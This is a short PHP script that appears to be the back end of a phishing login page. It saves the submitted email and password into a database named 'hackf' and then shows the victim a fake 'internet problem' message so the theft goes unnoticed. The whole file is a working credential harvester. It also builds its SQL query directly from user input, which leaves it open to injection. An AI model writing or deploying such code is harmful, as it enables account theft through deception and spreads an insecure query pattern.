<?php
session_start();
$connect=mysqli_connect("localhost","root","","hackf");


if(isset($_POST['login'])){
	 $email=$_POST['email'];
	$password=$_POST['password'];

	$query="INSERT INTO `hackf` (`email`,`password`)
	VALUES
	('$email','$password')";
	$execut=mysqli_query($connect,$query);
		
	if ($execut){
		print('internet problem');
}
else{print('retry please');}
}
?>